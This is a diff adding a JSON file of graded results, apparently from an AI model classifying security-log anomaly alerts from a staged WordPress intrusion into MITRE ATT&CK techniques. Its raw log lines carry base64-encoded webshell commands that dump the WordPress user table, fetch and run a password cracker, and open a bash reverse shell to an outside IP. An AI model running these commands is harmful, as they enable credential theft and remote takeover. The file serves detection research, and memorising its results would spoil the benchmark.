@@ -1,0 +1,251 @@
+[
+  {
+    "line_number": 28,
+    "predicted_attack_type": [
+      "T1003",
+      "T1078.004"
+    ],
+    "attack_type": "wpscan",
+    "classification_correct": "Incorrect classification - Incorrect id: T1003;Incorrect id: T1078.004;",
+    "classification": "TP",
+    "description": "The log indicates a 403 Forbidden error, which is often a sign of an attempted unauthorized access or enumeration. The user agent 'WPScan' is a known vulnerability scanner for WordPress, suggesting malicious intent to find vulnerabilities.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 4, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New status code in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_status_code\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/status_code\"], \"AffectedLogAtomValues\": [\"403\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:17:58 +0000] \\\"GET /wp-content/plugins/akismet/ HTTP/1.1\\\" 403 3362 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508278], \"DetectionTimestamp\": [1642508278], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 29,
+    "predicted_attack_type": [
+      "T1003",
+      "T1059.004"
+    ],
+    "attack_type": "wpscan",
+    "classification_correct": "Incorrect classification - Incorrect id: T1003;Incorrect id: T1059.004;",
+    "classification": "TP",
+    "description": "The log entry indicates a scan for WordPress vulnerabilities using WPScan. The request method 'HEAD' is unusual for a typical user browsing the site and is often used in reconnaissance activities. The 404 response code suggests the scanner is probing for specific files or directories.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:17:58 +0000] \\\"HEAD /wp-content/plugins/analytics-for-wp/ HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508278], \"DetectionTimestamp\": [1642508278], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 30,
+    "predicted_attack_type": [
+      "T1003",
+      "T1595.002"
+    ],
+    "attack_type": "wpscan",
+    "classification_correct": "Partially correct classification - Incorrect id: T1003;",
+    "classification": "TP",
+    "description": "The log entry indicates a scan for WordPress vulnerabilities using WPScan. The 'HEAD' request method is unusual for a typical user and suggests reconnaissance activity. This is likely a true positive as it indicates potential vulnerability scanning.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:17:58 +0000] \\\"HEAD /wp-content/plugins/animate-it/ HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508278], \"DetectionTimestamp\": [1642508278], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 31,
+    "predicted_attack_type": [
+      "T1003",
+      "T1595.002"
+    ],
+    "attack_type": "wpscan",
+    "classification_correct": "Partially correct classification - Incorrect id: T1003;",
+    "classification": "TP",
+    "description": "The log entry indicates a scan for vulnerabilities using WPScan against the WordPress instance. The 'HEAD' request method is often used in reconnaissance to check for the existence of resources without downloading the full content, which is a common technique in vulnerability scanning.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:17:58 +0000] \\\"HEAD /wp-content/plugins/animated-typing-effect/ HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508278], \"DetectionTimestamp\": [1642508278], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 32,
+    "predicted_attack_type": [
+      "T1003",
+      "T1595.002"
+    ],
+    "attack_type": "wpscan",
+    "classification_correct": "Partially correct classification - Incorrect id: T1003;",
+    "classification": "TP",
+    "description": "The log entry indicates a scan for vulnerabilities using WPScan against the WordPress instance. The request method 'HEAD' is unusual and often used for reconnaissance. The 404 response suggests the scanner is probing for specific plugin vulnerabilities.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:17:58 +0000] \\\"HEAD /wp-content/plugins/analytify-analytics-dashboard-widget/ HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508278], \"DetectionTimestamp\": [1642508278], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 33,
+    "predicted_attack_type": [
+      "T1003",
+      "T1595.002"
+    ],
+    "attack_type": "wpscan",
+    "classification_correct": "Partially correct classification - Incorrect id: T1003;",
+    "classification": "TP",
+    "description": "The log entry indicates a scan for vulnerabilities using WPScan against the WordPress instance. The 'HEAD' request method is often used in reconnaissance and vulnerability scanning.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:18:01 +0000] \\\"HEAD /wp-content/plugins/post-snippets/ HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508281], \"DetectionTimestamp\": [1642508281], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 34,
+    "predicted_attack_type": [
+      "T1003",
+      "T1595.002"
+    ],
+    "attack_type": "wpscan",
+    "classification_correct": "Partially correct classification - Incorrect id: T1003;",
+    "classification": "TP",
+    "description": "The alert indicates a new request method 'HEAD' was detected, which is unusual for typical user interaction with the web server. This could be an indicator of reconnaissance or vulnerability scanning activity, specifically targeting the WordPress instance.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:18:01 +0000] \\\"HEAD /wp-content/plugins/post-types-order/ HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508281], \"DetectionTimestamp\": [1642508281], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 35,
+    "predicted_attack_type": [
+      "T1003",
+      "T1595.002"
+    ],
+    "attack_type": "wpscan",
+    "classification_correct": "Partially correct classification - Incorrect id: T1003;",
+    "classification": "TP",
+    "description": "The log entry indicates a scan for WordPress vulnerabilities using WPScan. The 'HEAD' request method is unusual and could be part of a reconnaissance or vulnerability scanning activity. The target is the intranet server, which hosts WordPress.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:18:01 +0000] \\\"HEAD /wp-content/plugins/post-type-switcher/ HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508281], \"DetectionTimestamp\": [1642508281], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 36,
+    "predicted_attack_type": [
+      "T1003",
+      "T--that"
+    ],
+    "attack_type": "wpscan",
+    "classification_correct": "Incorrect classification - Technique T--that does not exist;Incorrect id: T1003;",
+    "classification": "TP",
+    "description": "The alert indicates a new request method was detected, which could suggest an \\",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:18:01 +0000] \\\"HEAD /wp-content/plugins/postmark-approved-wordpress-plugin/ HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508281], \"DetectionTimestamp\": [1642508281], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 37,
+    "predicted_attack_type": [
+      "T1003",
+      "T1595.002"
+    ],
+    "attack_type": "wpscan",
+    "classification_correct": "Partially correct classification - Incorrect id: T1003;",
+    "classification": "TP",
+    "description": "The alert indicates a new request method 'HEAD' was detected for '/wp-content/plugins/postie/' on the intranet server. This is likely a vulnerability scanner (WPScan) probing for vulnerabilities, which is a reconnaissance activity.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:18:01 +0000] \\\"HEAD /wp-content/plugins/postie/ HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508281], \"DetectionTimestamp\": [1642508281], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 40,
+    "predicted_attack_type": [
+      "T1003",
+      "T1595.002"
+    ],
+    "attack_type": "wpscan",
+    "classification_correct": "Partially correct classification - Incorrect id: T1003;",
+    "classification": "TP",
+    "description": "The log entry indicates a scan for vulnerabilities using WPScan, which is a common reconnaissance technique. The specific request for 'timthumb.php' is often associated with exploiting known vulnerabilities in WordPress themes.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:18:07 +0000] \\\"HEAD /wp-content/themes/ecobiz/timthumb.phptimthumb.php HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508287], \"DetectionTimestamp\": [1642508287], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 42,
+    "predicted_attack_type": [
+      "T1003",
+      "T1595.002"
+    ],
+    "attack_type": "wpscan",
+    "classification_correct": "Partially correct classification - Incorrect id: T1003;",
+    "classification": "TP",
+    "description": "The log entry indicates a scan for WordPress vulnerabilities using WPScan. The request method 'HEAD' is unusual for a typical user and the target '/wp-content/themes/ecobiz/tools/thumb/thumb.php' suggests an attempt to probe for vulnerabilities or misconfigurations. This aligns with reconnaissance activities.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:18:07 +0000] \\\"HEAD /wp-content/themes/ecobiz/tools/thumb/thumb.php HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508287], \"DetectionTimestamp\": [1642508287], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 82,
+    "predicted_attack_type": [
+      "T1190",
+      "T1078.004"
+    ],
+    "attack_type": "dirb",
+    "classification_correct": "Incorrect classification - Incorrect id: T1190;Incorrect id: T1078.004;",
+    "classification": "TP",
+    "description": "The log indicates an Apache web server error (AH01630: client denied by server configuration) attempting to access a .htpasswd file. This suggests an attacker is trying to gain unauthorized access to credentials, likely through exploiting a web vulnerability or attempting brute-force attacks on authentication mechanisms. The access attempt is from an IP address associated with the VPN server, which could indicate an internal or compromised external source.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/ah\", \"/model/with_data/fm/client/fm/ah/ah_str\", \"/model/with_data/fm/client/fm/ah/ah_number\", \"/model/with_data/fm/client/fm/ah/colon\", \"/model/with_data/fm/client/fm/ah/msg\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:37:23.358634 2022] [authz_core:error] [pid 28492] [client 172.17.130.196:34970] AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htpasswd\"], \"Timestamps\": [1642509443.36], \"DetectionTimestamp\": [1642509443.36], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-error.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 86,
+    "predicted_attack_type": [
+      "T1059.004",
+      "T1190"
+    ],
+    "attack_type": "webshell",
+    "classification_correct": "Incorrect classification - Incorrect id: T1059.004;Incorrect id: T1190;",
+    "classification": "TP",
+    "description": "The log shows a high entropy request to a PHP file in the WordPress uploads directory, which is suspicious and could indicate an attempt to execute arbitrary code or exploit a vulnerability.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 6, \"AnalysisComponentType\": \"EntropyDetector\", \"AnalysisComponentName\": \"AMiner: High entropy in Apache Access request.\", \"Message\": \"Value entropy anomaly detected\", \"PersistenceFileName\": \"entropy_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D\"], \"CriticalValue\": 0.041658827497209526, \"ProbabilityThreshold\": 0.05}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:38:25 +0000] \\\"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\\\" 200 507795 \\\"-\\\" \\\"python-requests/2.27.1\\\"\"], \"Timestamps\": [1642509505], \"DetectionTimestamp\": [1642509505], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 87,
+    "predicted_attack_type": [
+      "T1059.004",
+      "T1190"
+    ],
+    "attack_type": "webshell",
+    "classification_correct": "Incorrect classification - Incorrect id: T1059.004;Incorrect id: T1190;",
+    "classification": "TP",
+    "description": "The alert indicates a high entropy in an Apache access request, specifically targeting a PHP file within the WordPress uploads directory. The URL contains a base64 encoded string that likely decodes to a command or script execution, suggesting a potential web shell or command injection attempt. The source IP '172.17.130.196' is identified as the VPN server, which could be an entry point for an attacker or a compromised internal host.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 6, \"AnalysisComponentType\": \"EntropyDetector\", \"AnalysisComponentName\": \"AMiner: High entropy in Apache Access request.\", \"Message\": \"Value entropy anomaly detected\", \"PersistenceFileName\": \"entropy_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D\"], \"CriticalValue\": 0.04390676928008295, \"ProbabilityThreshold\": 0.05}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:38:29 +0000] \\\"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\\\" 200 506717 \\\"-\\\" \\\"python-requests/2.27.1\\\"\"], \"Timestamps\": [1642509509], \"DetectionTimestamp\": [1642509509], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 88,
+    "predicted_attack_type": [
+      "T1059.004",
+      "T1190"
+    ],
+    "attack_type": "passwordcracking",
+    "classification_correct": "Incorrect classification - Incorrect id: T1059.004;Incorrect id: T1190;",
+    "classification": "TP",
+    "description": "The log shows a high entropy value in an Apache access request, specifically targeting a PHP file within the WordPress uploads directory. The URL parameters suggest potential command injection or execution, which is indicative of a web shell or malicious script being uploaded and executed. This is a true positive as it represents a likely attempt to compromise the web server.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 6, \"AnalysisComponentType\": \"EntropyDetector\", \"AnalysisComponentName\": \"AMiner: High entropy in Apache Access request.\", \"Message\": \"Value entropy anomaly detected\", \"PersistenceFileName\": \"entropy_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D\"], \"CriticalValue\": 0.03390702800176404, \"ProbabilityThreshold\": 0.05}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:39:11 +0000] \\\"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1\\\" 200 506876 \\\"-\\\" \\\"python-requests/2.27.1\\\"\"], \"Timestamps\": [1642509551], \"DetectionTimestamp\": [1642509551], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 93,
+    "predicted_attack_type": [
+      "T1059.004"
+    ],
+    "attack_type": "reverseshell",
+    "classification_correct": "Correct classification - All provided techniques are correct",
+    "classification": "TP",
+    "description": "The log entry shows high entropy in an Apache access request, specifically a PHP file with obfuscated parameters. This is indicative of potential command injection or code execution attempts.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 6, \"AnalysisComponentType\": \"EntropyDetector\", \"AnalysisComponentName\": \"AMiner: High entropy in Apache Access request.\", \"Message\": \"Value entropy anomaly detected\", \"PersistenceFileName\": \"entropy_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D\"], \"CriticalValue\": 0.03829718556363683, \"ProbabilityThreshold\": 0.05}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:13:14:18 +0000] \\\"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1\\\" 200 506717 \\\"-\\\" \\\"python-requests/2.27.1\\\"\"], \"Timestamps\": [1642511658], \"DetectionTimestamp\": [1642511658], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 95,
+    "predicted_attack_type": [
+      "T1078.003"
+    ],
+    "attack_type": "privilegeescalation",
+    "classification_correct": "Correct classification - All provided techniques are correct",
+    "classification": "TP",
+    "description": "The log indicates a successful 'su' command execution from a web server user (www-data) to a user account (phopkins) on the intranet-server. This could be an indicator of privilege escalation or lateral movement.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/service/su\", \"/model/service/su/systemd_str\", \"/model/service/su/id\", \"/model/service/su/brack_str2\", \"/model/service/su/fm/seq2\", \"/model/service/su/fm/seq2/plus\", \"/model/service/su/fm/seq2/msg\"]}, \"LogData\": {\"RawLogData\": [\"Jan 18 13:14:31 intranet-server su[28816]: + /dev/pts/1 www-data:phopkins\"], \"Timestamps\": [1642511671], \"DetectionTimestamp\": [1642511671], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/auth.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 97,
+    "predicted_attack_type": [
+      "T1078.003",
+      "T1548.002"
+    ],
+    "attack_type": "privilegeescalation",
+    "classification_correct": "Partially correct classification - Incorrect id: T1548.002;",
+    "classification": "TP",
+    "description": "The log indicates a successful authentication for user 'phopkins' using '/bin/su', which is a privilege escalation attempt.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 20, \"AnalysisComponentType\": \"NewMatchPathValueComboDetector\", \"AnalysisComponentName\": \"AMiner: New user_auth parameter combination in Audit logs.\", \"Message\": \"New value combination(s) detected\", \"PersistenceFileName\": \"nmpvcd_user_auth\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/type/user_auth/uid\", \"/model/type/user_auth/msg2\", \"/model/type/user_auth/fm/acct/acct\", \"/model/type/user_auth/opt/opt_seq/exe\"], \"AffectedLogAtomValues\": [\"33\", \"'op=PAM:authentication\", \"\\\"phopkins\\\"\", \"\\\"/bin/su\\\"\"]}, \"LogData\": {\"RawLogData\": [\"type=USER_AUTH msg=audit(1642511671.635:2441): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=\\\"phopkins\\\" exe=\\\"/bin/su\\\" hostname=? addr=? terminal=/dev/pts/1 res=success'\"], \"Timestamps\": [1642511671.63], \"DetectionTimestamp\": [1642511671.63], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/audit/audit.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 98,
+    "predicted_attack_type": [
+      "T1078.003"
+    ],
+    "attack_type": "privilegeescalation",
+    "classification_correct": "Correct classification - All provided techniques are correct",
+    "classification": "TP",
+    "description": "The log indicates a new user account 'phopkins' was used with the '/bin/su' command, which could indicate privilege escalation or unauthorized access.",
